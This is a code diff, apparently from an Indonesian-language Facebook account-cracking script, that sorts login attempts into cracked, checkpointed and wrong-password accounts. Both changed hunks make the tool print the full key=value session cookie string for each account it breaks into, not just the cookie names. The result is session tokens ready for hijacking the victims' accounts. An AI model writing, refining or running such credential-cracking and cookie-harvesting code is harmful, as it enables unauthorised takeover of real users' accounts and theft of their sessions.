@@ -68,7 +68,8 @@ class Eksekusi(Main):
 				print(f"\r[×] Akun sesi new					\n\n",end="")
 			else:
 				aman+=1
-				print(f"\r[√] Akun Aman\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n\n",end="")
+				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				print(f"\r[√] Akun Aman\n[=] Cookie: {coki}				\n\n",end="")
 		elif "checkpoint" in session.cookies.get_dict():
 			cp+=1
 			title=re.findall("\<title>(.*?)<\/title>",str(response))
@@ -108,7 +109,8 @@ class Eksekusi(Main):
 				if "c_user" in session.cookies.get_dict():
 					cp-=1
 					aman+=1
-					print(f"\r[√] Akun Aman\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n",end="")
+					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+					print(f"\r[√] Akun Aman\n[=] Cookie: {coki}				\n",end="")
 					
 		else:
 			salah+=1
